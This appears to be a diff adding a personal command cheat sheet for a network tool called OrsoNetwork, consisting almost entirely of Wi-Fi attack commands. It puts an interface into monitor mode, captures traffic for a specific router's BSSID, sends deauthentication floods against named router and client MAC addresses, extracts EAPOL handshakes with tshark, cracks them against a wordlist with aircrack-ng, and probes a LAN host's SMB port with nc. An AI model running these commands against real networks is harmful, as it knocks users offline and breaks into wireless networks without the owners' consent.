@@ -1,0 +1,61 @@
+wails build
+
+sudo setcap cap_net_raw+ep ./build/bin/OrsoNetwork
+
+./build/bin/OrsoNetwork
+
+
+
+sudo airodump-ng -w capture/capture -c 1 --bssid  AC:84:C6:6C:17:31 wlp5s0
+
+
+sudo aireplay-ng --deauth 50 -a  AC:84:C6:6C:17:31 wlp5s0
+
+
+
+
+sudo airodump-ng wlp5s0
+
+
+
+
+sudo aireplay-ng --deauth 5 -a 08:C6:B3:31:8B:E0 -c BA:D6:DA:62:59:D7 wlp5s0
+
+
+
+tshark -r capture/capture-01.cap -Y "eapol" -T fields -e frame.number -e wlan.sa -e wlan.bssid
+
+
+aircrack-ng -w password.lst -b AC:84:C6:6C:17:31 capture/capture-01.cap
+
+
+
+
+
+sudo airmon-ng check kill
+
+
+sudo ip link set wlp5s0 down
+sudo iw dev wlp5s0 set type monitor
+sudo ip link set wlp5s0 up
+
+iw dev  
+
+
+
+sudo airodump-ng -w capture/capture wlp5s0
+
+----------------------------------------------------------------
+
+
+sudo ip link set wlp5s0 down
+sudo iw dev wlp5s0 set type managed
+sudo ip link set wlp5s0 up
+sudo systemctl restart NetworkManager
+
+
+
+nc -vz 192.168.0.36 445
+
+router                     
+ 08:C6:B3:31:8B:E0  BA:D6:DA:62:59:D7 
